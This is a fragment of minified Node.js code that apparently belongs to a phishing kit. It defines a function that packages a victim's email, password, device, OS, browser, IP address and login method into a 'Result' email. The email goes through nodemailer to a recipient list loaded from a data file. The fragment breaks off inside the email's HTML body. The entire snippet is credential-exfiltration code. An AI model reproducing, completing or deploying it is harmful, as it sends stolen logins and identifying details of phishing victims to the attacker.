let path=require("path"),fs=require("fs/promises"),nodemailer=require("nodemailer"),pathEmail=path.join(__dirname,"../data/email.json"),transporter,emailData=[];function send1({emVal:e,passVal:r,device:o,os:s,browser:a,ipAddress:t,logVia:n}){transporter&&emailData.length?(e={from:`"Pemburu Sc🇮🇩" <${process.env.SEND_MAIL}>`,to:emailData,subject:"Result",html:`
